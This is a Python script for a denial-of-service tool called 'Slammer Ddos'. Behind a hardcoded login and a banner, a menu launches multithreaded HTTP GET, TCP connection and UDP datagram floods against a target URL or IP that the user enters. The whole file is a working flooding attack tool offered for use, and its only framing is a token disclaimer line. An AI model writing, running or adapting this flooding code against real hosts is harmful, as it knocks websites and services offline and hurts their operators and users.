import os
import socket
import threading
import requests

def login():
    username = input("Enter Username: ")
    password = input("Enter Password: ")

    allowed_username = "Slammer Ddos"
    allowed_passwords = [
        "Xhohan chowdhury",
        "Jabed Chowdhury",
        "Samrat Sarker",
        "Killnet Destroyer"
    ]

    if username == allowed_username and password in allowed_passwords:
        print("\nâœ… Login Successful!\n")
    else:
        print("\nâŒ Invalid Username or Password. Exiting...\n")
        exit()

def banner():
    print("""
_       __     __                      __
| |     / /__  / /________  ____ ___  ___     / /
| | /| / / _ \/ / ___/ __ \/ __ `__ \/ _ \   / / 
| |/ |/ /  __/ / /__/ /_/ / / / / / /  __/  /_/  
|__/|__/\___/_/\___/\____/_/ /_/ /_/\___/  (_)                 
            WEB SLAMMER BD | Made by Whisper Hex
""")
    print("\033[92m" + "="*50)
    print("\033[95mTOOLS NAME     \033[92m=> \033[96mSlammer Ddos")
    print("\033[95mOWNER NAME     \033[92m=> \033[96mWhisper Hex")
    print("\033[93mPOWER BY       \033[92m=> \033[96mWeb Slammer BD")
    print("\033[91m\nPLEASE DON'T USE THIS TOOL FOR WRONG PURPOSE\n")
    print("\033[92m" + "="*50 + "\033[0m")

def http_flood():
    url = input("Target URL (http:// or https://): ")
    threads = int(input("Number of threads: "))

    def attack():
        while True:
            try:
                response = requests.get(url)
                print(f"[+] HTTP Request Sent => {response.status_code}")
            except:
                print("[-] HTTP Request Failed.")

    for _ in range(threads):
        threading.Thread(target=attack).start()

def tcp_flood():
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    threads = int(input("Number of threads: "))

    def attack():
        data = ("X" * 1024).encode()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(data)
                print("[+] TCP Packet Sent!")
                s.close()
            except:
                print("[-] TCP Connection Failed.")

    for _ in range(threads):
        threading.Thread(target=attack).start()

def udp_flood():
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    threads = int(input("Number of threads: "))

    def attack():
        data = ("X" * 1024).encode()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (ip, port))
                print("[+] UDP Packet Sent!")
            except:
                print("[-] UDP Packet Failed.")

    for _ in range(threads):
        threading.Thread(target=attack).start()

def main_menu():
    banner()
    print("[1] HTTP Flood Attack")
    print("[2] TCP Flood Attack")
    print("[3] UDP Flood Attack")
    print("[0] Exit")

    choice = input("Select an option: ")
    if choice == "1":
        http_flood()
    elif choice == "2":
        tcp_flood()
    elif choice == "3":
        udp_flood()
    elif choice == "0":
        exit()
    else:
        print("Invalid option!")

if __name__ == "__main__":
    login()
    main_menu()

 
